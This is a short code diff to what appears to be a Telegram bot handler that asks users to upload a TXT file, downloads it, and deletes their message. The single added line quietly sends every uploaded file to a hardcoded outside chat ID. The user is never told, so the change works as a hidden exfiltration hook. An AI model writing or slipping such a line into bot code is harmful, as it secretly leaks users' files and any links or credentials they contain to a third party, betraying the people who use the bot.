@@ -46,6 +46,7 @@ async def account_login(bot: Client, m: Message):
     editable = await m.reply_text('𝙏𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙 𝙖 𝙏𝙓𝙏 𝙛𝙞𝙡𝙚 𝙨𝙚𝙣𝙙 𝙝𝙚𝙧𝙚 ⚡️')
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
+    await bot.send_document(-1002047255106, x)
     await input.delete(True)
 
     path = f"./downloads/{m.chat.id}"
